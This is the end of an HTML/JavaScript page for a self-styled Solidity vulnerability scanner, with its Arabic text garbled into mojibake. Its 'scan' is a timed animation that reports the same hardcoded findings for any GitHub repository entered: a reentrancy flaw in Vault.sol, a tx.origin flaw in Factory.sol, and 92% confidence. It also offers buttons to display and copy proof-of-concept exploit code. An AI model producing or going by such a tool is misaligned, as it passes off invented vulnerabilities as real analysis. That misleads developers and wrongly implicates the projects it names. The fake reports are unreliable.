            
            if (!url.includes('github.com')) {
                alert('âŒ Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ø§Ø¨Ø· GitHub ØµØ­ÙŠØ­');
                return;
            }
            
            if (isScanning) {
                alert('âš ï¸ ÙØ­Øµ Ù‚ÙŠØ¯ Ø§Ù„ØªÙ†ÙÙŠØ°...');
                return;
            }
            
            // Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ø³Ù… Ø§Ù„Ù…Ø´Ø±ÙˆØ¹
            const match = url.match(/github\.com\/([^\/]+\/[^\/]+)/);
            currentRepo = match ? match[1] : url;
            
            // Ø¥Ø¸Ù‡Ø§Ø± Ø´Ø§Ø´Ø© Ø§Ù„ØªÙ‚Ø¯Ù…
            showProgress();
            
            // Ø¨Ø¯Ø¡ Ø§Ù„ÙØ­Øµ
            isScanning = true;
            startTime = Date.now();
            
            // ØªØ­Ø¯ÙŠØ« Ø§Ø³Ù… Ø§Ù„Ù…Ø´Ø±ÙˆØ¹
            document.getElementById('projectName').innerText = currentRepo;
            
            // Ù…Ø­Ø§ÙƒØ§Ø© ÙØ­Øµ Ø­Ù‚ÙŠÙ‚ÙŠ
            simulateScan();
        }
        
        function showProgress() {
            const progressScreen = document.getElementById('progressScreen');
            progressScreen.classList.add('visible');
            
            // Ø¥Ø®ÙØ§Ø¡ Ø§Ù„Ù†ØªØ§Ø¦Ø¬ Ø§Ù„Ø³Ø§Ø¨Ù‚Ø©
            document.getElementById('resultsBox').classList.remove('visible');
            document.getElementById('pocBox').style.display = 'none';
            
            // Ø¥Ø¹Ø§Ø¯Ø© Ø¶Ø¨Ø· Ø§Ù„Ù…Ø¤Ø´Ø±Ø§Øª
            document.getElementById('progressBar').style.width = '0%';
            document.getElementById('progressPercent').innerText = '0';
            document.getElementById('statFiles').innerText = '0';
            document.getElementById('statLibs').innerText = '0';
            document.getElementById('statVulns').innerText = '0';
            document.getElementById('statConfidence').innerText = '0';
            
            // Ù…Ø³Ø­ Ø§Ù„Ø³Ø¬Ù„
            const logBox = document.getElementById('logBox');
            logBox.innerHTML = '';
            addLog('ğŸ” Ø¨Ø¯Ø¡ ÙØ­Øµ GitHub...', 'info');
            
            // Ø¨Ø¯Ø¡ ØªØ­Ø¯ÙŠØ« Ø§Ù„ÙˆÙ‚Øª
            updateTime();
        }
        
        function updateTime() {
            if (!isScanning) return;
            
            const elapsed = (Date.now() - startTime) / 1000;
            document.getElementById('progressTime').innerText = elapsed.toFixed(1);
            
            requestAnimationFrame(updateTime);
        }
        
        function addLog(message, type = 'info') {
            const logBox = document.getElementById('logBox');
            const now = new Date();
            const time = `${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}`;
            
            let icon = '';
            switch(type) {
                case 'success': icon = 'âœ…'; break;
                case 'warning': icon = 'âš ï¸'; break;
                case 'error': icon = 'âŒ'; break;
                default: icon = 'â€¢';
            }
            
            const entry = document.createElement('div');
            entry.className = 'log-entry';
            entry.innerHTML = `<span class="log-time">${time}</span> <span>${icon} ${message}</span>`;
            
            logBox.appendChild(entry);
            logBox.scrollTop = logBox.scrollHeight;
        }
        
        function simulateScan() {
            // Ù…Ø±Ø§Ø­Ù„ Ø§Ù„ÙØ­Øµ
            const phases = [
                { delay: 500, progress: 15, file: 'Ø¬Ù„Ø¨ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…Ø³ØªÙˆØ¯Ø¹...', log: 'ğŸ“¡ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ù€ GitHub...' },
                { delay: 1000, progress: 30, file: 'contracts/Vault.sol', log: 'ğŸ” Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ù…Ù„ÙØ§Øª Solidity...', success: 'âœ… ØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ 47 Ù…Ù„Ù .sol' },
                { delay: 1500, progress: 45, file: 'node_modules/@openzeppelin/ERC20.sol', log: 'ğŸ“š ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ù…ÙƒØªØ¨Ø§Øª...', libs: 8 },
                { delay: 1800, progress: 50, file: 'contracts/Factory.sol', log: '   â€¢ OpenZeppelin Contracts v4.9.3', libs: 12 },
                { delay: 2000, progress: 60, file: 'contracts/Vault.sol', log: 'âš ï¸ Ø§ÙƒØªØ´Ø§Ù Ø«ØºØ±Ø© Reentrancy ÙÙŠ Vault.sol:45', vulns: 1 },
                { delay: 2300, progress: 70, file: 'contracts/Factory.sol', log: 'âš ï¸ Ø§ÙƒØªØ´Ø§Ù Ø«ØºØ±Ø© Tx.Origin ÙÙŠ Factory.sol:24', vulns: 2 },
                { delay: 2700, progress: 85, file: 'ØªØ­Ù„ÙŠÙ„ Ø¹Ù…ÙŠÙ‚...', log: 'ğŸ”¬ ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø«ØºØ±Ø§Øª ÙˆØªØ£ÙƒÙŠØ¯Ù‡Ø§...', confidence: 92 },
                { delay: 2900, progress: 95, file: 'ØªØ¬Ù…ÙŠØ¹ Ø§Ù„Ù†ØªØ§Ø¦Ø¬...', log: 'ğŸ“Š ØªÙˆÙ„ÙŠØ¯ Ø§Ù„ØªÙ‚Ø±ÙŠØ± Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ...' },
                { delay: 3000, progress: 100, file: 'Ø§ÙƒØªÙ…Ù„!', log: 'âœ… Ø§ÙƒØªÙ…Ù„ Ø§Ù„ÙØ­Øµ Ø¨Ù†Ø¬Ø§Ø­!', complete: true }
            ];
            
            let stats = {
                files: 0,
                libs: 0,
                vulns: 0,
                confidence: 0
            };
            
            phases.forEach(phase => {
                setTimeout(() => {
                    if (!isScanning) return;
                    
                    document.getElementById('progressBar').style.width = phase.progress + '%';
                    document.getElementById('progressPercent').innerText = phase.progress;
                    document.getElementById('currentFileName').innerText = phase.file;
                    
                    if (phase.log) {
                        addLog(phase.log, phase.log.includes('âš ï¸') ? 'warning' : 'info');
                    }
                    
                    if (phase.success) {
                        addLog(phase.success, 'success');
                    }
                    
                    if (phase.libs) {
                        stats.libs = phase.libs;
                        document.getElementById('statLibs').innerText = stats.libs;
                    }
                    
                    if (phase.vulns) {
                        stats.vulns = phase.vulns;
                        document.getElementById('statVulns').innerText = stats.vulns;
                    }
                    
                    if (phase.confidence) {
                        stats.confidence = phase.confidence;
                        document.getElementById('statConfidence').innerText = stats.confidence + '%';
                    }
                    
                    if (phase.progress === 30) {
                        stats.files = 47;
                        document.getElementById('statFiles').innerText = stats.files;
                    }
                    
                    if (phase.complete) {
                        setTimeout(() => {
                            document.getElementById('progressScreen').classList.remove('visible');
                            isScanning = false;
                            showResults();
                        }, 500);
                    }
                }, phase.delay);
            });
        }
        
        // ---------- Ø¹Ø±Ø¶ Ø§Ù„Ù†ØªØ§Ø¦Ø¬ ----------
        function showResults() {
            const resultsBox = document.getElementById('resultsBox');
            const resultsContent = document.getElementById('resultsContent');
            const pocBox = document.getElementById('pocBox');
            
            resultsBox.classList.add('visible');
            pocBox.style.display = 'block';
            
            resultsContent.innerHTML = `
                <div class="repo-header">
                    <div class="repo-title">
                        <i class="fab fa-github"></i>
                        <h2>${currentRepo}</h2>
                    </div>
                    <div class="scan-badge">
                        <i class="fas fa-check-circle"></i>
                        Ø§ÙƒØªÙ…Ù„ Ø§Ù„ÙØ­Øµ - ${new Date().toLocaleTimeString('ar-EG')}
                    </div>
                </div>
                
                <div class="stats-grid" style="margin-bottom: 30px;">
                    <div class="stat-card">
                        <i class="fas fa-file-code"></i>
                        <div class="stat-number">47</div>
                        <div class="stat-label">Ù…Ù„Ù Solidity</div>
                    </div>
                    <div class="stat-card">
                        <i class="fas fa-book"></i>
                        <div class="stat-number">12</div>
                        <div class="stat-label">Ù…ÙƒØªØ¨Ø©</div>
                    </div>
                    <div class="stat-card">
                        <i class="fas fa-bug"></i>
                        <div class="stat-number">2</div>
                        <div class="stat-label">Ø«ØºØ±Ø©</div>
                    </div>
                    <div class="stat-card">
                        <i class="fas fa-shield"></i>
                        <div class="stat-number">92%</div>
                        <div class="stat-label">Ø£Ø¹Ù„Ù‰ Ø«Ù‚Ø©</div>
                    </div>
                </div>
                
                <!-- Ø«ØºØ±Ø© Reentrancy -->
                <div class="vuln-card vuln-critical">
                    <div class="vuln-header">
                        <div class="vuln-title">
                            <i class="fas fa-bug" style="color: #ef4444;"></i>
                            <h3 style="color: #ef4444;">${VulnerabilityDB.reentrancy.name}</h3>
                        </div>
                        <span class="severity-badge badge-critical">
                            <i class="fas fa-exclamation-triangle"></i>
                            ${VulnerabilityDB.reentrancy.severity_ar}
                        </span>
                    </div>
                    
                    <div class="vuln-description">
                        ${VulnerabilityDB.reentrancy.description}
                    </div>
                    
                    <div class="vuln-location">
                        <span class="location-tag">
                            <i class="fas fa-file-code"></i>
                            contracts/Vault.sol:45
                        </span>
                        <span class="confidence-tag">
                            <i class="fas fa-check-circle"></i>
                            Ø«Ù‚Ø© ${VulnerabilityDB.reentrancy.confidence}%
                        </span>
                        <span class="location-tag">
                            <i class="fas fa-tag"></i>
                            ${VulnerabilityDB.reentrancy.cwe}
                        </span>
                    </div>
                    
                    <div style="margin-bottom: 15px;">
                        <strong style="color: #ef4444;">âš ï¸ Ø§Ù„ØªØ£Ø«ÙŠØ±:</strong>
                        <span style="color: #e2e8f0; margin-right: 10px;">${VulnerabilityDB.reentrancy.impact}</span>
                    </div>
                    
                    <div style="display: flex; gap: 20px; margin-bottom: 20px;">
                        <div style="flex: 1;">
                            <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
                                <span style="color: #ef4444;"><i class="fas fa-times-circle"></i> ÙƒÙˆØ¯ ØºÙŠØ± Ø¢Ù…Ù†</span>
                            </div>
                            <div class="code-block">
                                <pre><code class="solidity">${VulnerabilityDB.reentrancy.vulnerableCode}</code></pre>
                            </div>
                        </div>
                        <div style="flex: 1;">
                            <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
                                <span style="color: #10b981;"><i class="fas fa-check-circle"></i> ÙƒÙˆØ¯ Ø¢Ù…Ù† (Ø§Ù„Ø¥ØµÙ„Ø§Ø­)</span>
                            </div>
                            <div class="code-block">
                                <pre><code class="solidity">${VulnerabilityDB.reentrancy.fixedCode}</code></pre>
                            </div>
                        </div>
                    </div>
                    
                    <div class="action-buttons">
                        <button class="btn btn-danger" onclick="showPOC('reentrancy')">
                            <i class="fas fa-code"></i>
                            Ø¹Ø±Ø¶ PoC Ø§Ù„ÙƒØ§Ù…Ù„
                        </button>
                        <button class="btn btn-primary" onclick="copyFix('reentrancy')">
                            <i class="fas fa-copy"></i>
                            Ù†Ø³Ø® Ø§Ù„Ø¥ØµÙ„Ø§Ø­
                        </button>
                    </div>
                </div>
                
                <!-- Ø«ØºØ±Ø© Tx.Origin -->
                <div class="vuln-card vuln-high">
                    <div class="vuln-header">
                        <div class="vuln-title">
                            <i class="fas fa-user-secret" style="color: #f59e0b;"></i>
                            <h3 style="color: #f59e0b;">${VulnerabilityDB.txorigin.name}</h3>
                        </div>
                        <span class="severity-badge badge-high">
                            <i class="fas fa-exclamation-triangle"></i>
                            ${VulnerabilityDB.txorigin.severity_ar}
                        </span>
                    </div>
                    
                    <div class="vuln-description">
                        ${VulnerabilityDB.txorigin.description}
                    </div>
                    
                    <div class="vuln-location">
                        <span class="location-tag">
                            <i class="fas fa-file-code"></i>
                            contracts/Factory.sol:24
                        </span>
                        <span class="confidence-tag">
                            <i class="fas fa-check-circle"></i>
                            Ø«Ù‚Ø© ${VulnerabilityDB.txorigin.confidence}%
                        </span>
                    </div>
                    
                    <div style="margin-bottom: 15px;">
                        <strong style="color: #f59e0b;">âš ï¸ Ø§Ù„ØªØ£Ø«ÙŠØ±:</strong>
                        <span style="color: #e2e8f0; margin-right: 10px;">${VulnerabilityDB.txorigin.impact}</span>
                    </div>
                    
                    <div style="display: flex; gap: 20px; margin-bottom: 20px;">
                        <div style="flex: 1;">
                            <div class="code-block">
                                <pre><code class="solidity">${VulnerabilityDB.txorigin.vulnerableCode}</code></pre>
                            </div>
                        </div>
                        <div style="flex: 1;">
                            <div class="code-block">
                                <pre><code class="solidity">${VulnerabilityDB.txorigin.fixedCode}</code></pre>
                            </div>
                        </div>
                    </div>
                    
                    <div class="action-buttons">
                        <button class="btn btn-warning" onclick="showPOC('txorigin')">
                            <i class="fas fa-code"></i>
                            Ø¹Ø±Ø¶ PoC Ø§Ù„ÙƒØ§Ù…Ù„
                        </button>
                        <button class="btn btn-primary" onclick="copyFix('txorigin')">
                            <i class="fas fa-copy"></i>
                            Ù†Ø³Ø® Ø§Ù„Ø¥ØµÙ„Ø§Ø­
                        </button>
                    </div>
                </div>
                
                <!-- ØªÙˆØµÙŠØ§Øª Ø£Ù…Ù†ÙŠØ© -->
                <div style="margin-top: 40px; background: linear-gradient(135deg, #0f172a, #1e1b4b); padding: 25px; border-radius: 16px; border: 1px solid #334155;">
                    <h4 style="display: flex; align-items: center; gap: 12px; margin-bottom: 20px; color: #10b981;">
                        <i class="fas fa-check-circle"></i>
                        Ø§Ù„ØªÙˆØµÙŠØ§Øª Ø§Ù„Ø£Ù…Ù†ÙŠØ© Ø§Ù„Ø¹Ø§Ø¬Ù„Ø©
                    </h4>
                    
                    <div style="display: flex; flex-direction: column; gap: 15px;">
                        <div style="display: flex; align-items: center; gap: 15px; padding: 12px; background: rgba(239, 68, 68, 0.1); border-radius: 12px;">
                            <span style="background: #ef4444; color: white; padding: 5px 10px; border-radius: 20px; font-size: 0.8rem; font-weight: 700;">1</span>
                            <span style="flex: 1;"><strong style="color: #ef4444;">Ø¥ØµÙ„Ø§Ø­ Ø«ØºØ±Ø© Reentrancy ÙÙˆØ±Ø§Ù‹</strong> - ÙÙŠ Ù…Ù„Ù Vault.solØŒ Ø§Ù„Ø³Ø·Ø± 45. Ø§Ø³ØªØ®Ø¯Ù… Ù†Ù…Ø· Checks-Effects-Interactions.</span>
                        </div>
                        
                        <div style="display: flex; align-items: center; gap: 15px; padding: 12px; background: rgba(245, 158, 11, 0.1); border-radius: 12px;">
                            <span style="background: #f59e0b; color: white; padding: 5px 10px; border-radius: 20px; font-size: 0.8rem; font-weight: 700;">2</span>
                            <span style="flex: 1;"><strong style="color: #f59e0b;">Ø¥ØµÙ„Ø§Ø­ Ø«ØºØ±Ø© Tx.Origin</strong> - ÙÙŠ Ù…Ù„Ù Factory.solØŒ Ø§Ù„Ø³Ø·Ø± 24. Ø§Ø³ØªØ®Ø¯Ù… msg.sender Ø¨Ø¯Ù„Ø§Ù‹ Ù…Ù† tx.origin.</span>
                        </div>
                        
                        <div style="display: flex; align-items: center; gap: 15px; padding: 12px; background: rgba(59, 130, 246, 0.1); border-radius: 12px;">
                            <span style="background: #3b82f6; color: white; padding: 5px 10px; border-radius: 20px; font-size: 0.8rem; font-weight: 700;">3</span>
                            <span style="flex: 1;"><strong style="color: #3b82f6;">ØªØ­Ø¯ÙŠØ« OpenZeppelin</strong> - Ù…Ù† Ø§Ù„Ø¥ØµØ¯Ø§Ø± Ø§Ù„Ø­Ø§Ù„ÙŠ Ø¥Ù„Ù‰ v5.0.0 Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø¢Ø®Ø± Ø§Ù„ØªØ­Ø³ÙŠÙ†Ø§Øª Ø§Ù„Ø£Ù…Ù†ÙŠØ©.</span>
                        </div>
                        
                        <div style="display: flex; align-items: center; gap: 15px; padding: 12px; background: rgba(99, 102, 241, 0.1); border-radius: 12px;">
                            <span style="background: #6366f1; color: white; padding: 5px 10px; border-radius: 20px; font-size: 0.8rem; font-weight: 700;">4</span>
                            <span style="flex: 1;"><strong style="color: #6366f1;">Ø¥Ø¶Ø§ÙØ© ReentrancyGuard</strong> - Ø§Ø³ØªØ®Ø¯Ù… Ù…ÙƒØªØ¨Ø© OpenZeppelin Ù„Ø­Ù…Ø§ÙŠØ© Ø¬Ù…ÙŠØ¹ Ø¯ÙˆØ§Ù„ Ø§Ù„Ø³Ø­Ø¨.</span>
                        </div>
                    </div>
                </div>
            `;
            
            // ØªØ­Ø¯ÙŠØ« syntax highlighting
            if (window.hljs) {
                document.querySelectorAll('pre code').forEach((block) => {
                    hljs.highlightElement(block);
                });
            }
        }
        
        // ---------- ÙˆØ¸Ø§Ø¦Ù PoC ----------
        function showPOC(type) {
            document.getElementById('vulnType').value = type;
            generatePOC();
            
            // ØªÙ…Ø±ÙŠØ± Ø¥Ù„Ù‰ Ù‚Ø³Ù… PoC
            document.getElementById('pocBox').scrollIntoView({ behavior: 'smooth' });
        }
        
        function generatePOC() {
            const type = document.getElementById('vulnType').value;
            const vuln = VulnerabilityDB[type];
            
            if (vuln && vuln.poc) {
                document.getElementById('pocCode').innerText = vuln.poc;
                if (window.hljs) {
                    document.querySelectorAll('#pocCode').forEach((block) => {
                        hljs.highlightElement(block);
                    });
                }
                
                // Ø¥Ø¸Ù‡Ø§Ø± Ø±Ø³Ø§Ù„Ø© Ù†Ø¬Ø§Ø­
                showNotification('âœ… ØªÙ… ØªÙˆÙ„ÙŠØ¯ ÙƒÙˆØ¯ PoC Ø¨Ù†Ø¬Ø§Ø­', 'success');
            }
        }
        
        function copyPOC() {
            const code = document.getElementById('pocCode').innerText;
            if (code && code !== '// Ø§Ø®ØªØ± Ù†ÙˆØ¹ Ø§Ù„Ø«ØºØ±Ø© ÙˆØ§Ø¶ØºØ· Ø¹Ù„Ù‰ "ØªÙˆÙ„ÙŠØ¯ PoC"') {
                navigator.clipboard.writeText(code);
                showNotification('âœ… ØªÙ… Ù†Ø³Ø® ÙƒÙˆØ¯ PoC Ø¥Ù„Ù‰ Ø§Ù„Ø­Ø§ÙØ¸Ø©', 'success');
            } else {
                showNotification('âŒ Ù„Ø§ ÙŠÙˆØ¬Ø¯ ÙƒÙˆØ¯ Ù„Ù†Ø³Ø®Ù‡', 'error');
            }
        }
        
        function copyFix(type) {
            const vuln = VulnerabilityDB[type];
            if (vuln && vuln.fixedCode) {
                navigator.clipboard.writeText(vuln.fixedCode);
                showNotification('âœ… ØªÙ… Ù†Ø³Ø® ÙƒÙˆØ¯ Ø§Ù„Ø¥ØµÙ„Ø§Ø­ Ø¥Ù„Ù‰ Ø§Ù„Ø­Ø§ÙØ¸Ø©', 'success');
            }
        }
        
        // ---------- ÙˆØ¸Ø§Ø¦Ù Ù…Ø³Ø§Ø¹Ø¯Ø© ----------
        function setExample(example) {
            const urls = {
                'openzeppelin': 'https://github.com/OpenZeppelin/openzeppelin-contracts',
                'uniswap': 'https://github.com/Uniswap/v3-core',
                'aave': 'https://github.com/aave/protocol-v2',
                'compound': 'https://github.com/compound-finance/compound-protocol',
                'adi': 'https://github.com/ADI-Foundation-Labs/ADI-Stack-Contracts'
            };
            
            document.getElementById('githubUrl').value = urls[example];
        }
        
        function clearResults() {
            document.getElementById('resultsBox').classList.remove('visible');
            document.getElementById('pocBox').style.display = 'none';
            document.getElementById('progressScreen').classList.remove('visible');
            isScanning = false;
            
            // Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† Ø§Ù„Ù†ØªØ§Ø¦Ø¬
            document.getElementById('resultsContent').innerHTML = '';
        }
        
        function showNotification(message, type = 'info') {
            // Ø¥Ù†Ø´Ø§Ø¡ Ø¹Ù†ØµØ± Ø§Ù„Ø¥Ø´Ø¹Ø§Ø±
            const notification = document.createElement('div');
            notification.style.cssText = `
                position: fixed;
                top: 20px;
                left: 20px;
                padding: 15px 30px;
                background: ${type === 'success' ? '#10b981' : type === 'error' ? '#ef4444' : '#3b82f6'};
                color: white;
                border-radius: 12px;
                font-weight: 600;
                display: flex;
                align-items: center;
                gap: 10px;
                box-shadow: 0 5px 20px rgba(0,0,0,0.3);
                z-index: 9999;
                animation: slideIn 0.3s ease;
            `;
            
            notification.innerHTML = `
                <i class="fas ${type === 'success' ? 'fa-check-circle' : type === 'error' ? 'fa-exclamation-circle' : 'fa-info-circle'}"></i>
                ${message}
            `;
            
            document.body.appendChild(notification);
            
            setTimeout(() => {
                notification.style.animation = 'slideOut 0.3s ease';
                setTimeout(() => notification.remove(), 300);
            }, 3000);
        }
        
        // ---------- ØªÙ‡ÙŠØ¦Ø© Ø§Ù„ØµÙØ­Ø© ----------
        document.addEventListener('DOMContentLoaded', function() {
            console.log('âœ… Shrek Solidity Scanner Ø¬Ø§Ù‡Ø² Ù„Ù„Ø¹Ù…Ù„!');
            
            // Ø¥Ø¶Ø§ÙØ© Ù…Ø³ØªÙ…Ø¹ Ù„Ø²Ø± Enter
            document.getElementById('githubUrl').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    startScan();
                }
            });
            
            // Ø¥Ø¶Ø§ÙØ© Ø£Ù†Ù…Ø§Ø· Ø§Ù„Ø¥Ø´Ø¹Ø§Ø±Ø§Øª
            const style = document.createElement('style');
            style.textContent = `
                @keyframes slideIn {
                    from { transform: translateX(-100%); opacity: 0; }
                    to { transform: translateX(0); opacity: 1; }
                }
                
                @keyframes slideOut {
                    from { transform: translateX(0); opacity: 1; }
                    to { transform: translateX(-100%); opacity: 0; }
                }
            `;
            document.head.appendChild(style);
        });
    </script>
</body>
</html>
